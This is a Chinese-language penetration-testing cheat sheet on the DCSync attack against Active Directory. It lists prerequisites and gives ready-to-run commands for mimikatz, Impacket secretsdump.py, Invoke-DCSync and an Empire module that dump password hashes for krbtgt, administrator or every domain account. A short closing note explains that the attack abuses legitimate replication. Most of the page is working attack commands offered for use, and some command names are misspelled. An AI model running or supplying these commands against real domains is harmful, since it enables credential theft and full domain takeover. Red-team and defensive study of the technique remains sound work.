---
description: 横向移动 / 滥用身份验证 / 模拟域控同步敏感信息
---

# ✔️ DCSync攻击 - Domain Controller Synchronization

## 先决条件

* 需要获取到目标域内一个有效的域账户
* 该账户需要有足够高的权限，因为需要模拟域控之间的数据同步行为
  * Administrators组成员
  * 域管理员组成员
* 需要能够与目标域内的域控建立通信

## 常用工具

### mimikatz.exe

```powershell
mimikatz.exe
# 指定要同步的目标账户
lsadump::dcsync /user:administrator
lsadump::dcsync /user:krbtgt
lsadump::dcsync /all /csv
# 获取Hash NTLM字段的值
```

### Impacket

* 常用脚本：**secretsdump.py**

```bash
# 要同步的目标账户：krbtgt
python3 secretsdump.py -just-dc-user krbtgt target.com/username:password@192.168.xxx.xxx
# 同步所有账户的hash
python3 secretsdump.py -just-dc target.com/username:password@192.168.xxx.xxx
```

### Powershell

* 常用脚本：Invocke-DCSync.ps1

```powershell
Import-Moudle .\Invoke-DCSync.ps1
# 获取到指定目标账户的hash: krbtgt
Invoke-DCSync -DumpForest -Users @("krbtgt") | ft -wrap -autosize
# 获取到所有域内账户的hash
Invoke-DCSync -DumpForest | ft -wrap -autosize
# Emipre的相关模块（和mimikatz类似）
usemodule credentials/mimikatz/dcsync
```

{% hint style="info" %}
DCSync攻击的本质是利用了AD本身的功能，攻方模拟一个有复制权限的域控向目标内网中的其他域控发出同步数据的请求，以获取到特定的高权限的账户的密码哈希和其他敏感信息。其过程是利用的合法的DC同步功能，没有其他恶意操作
{% endhint %}
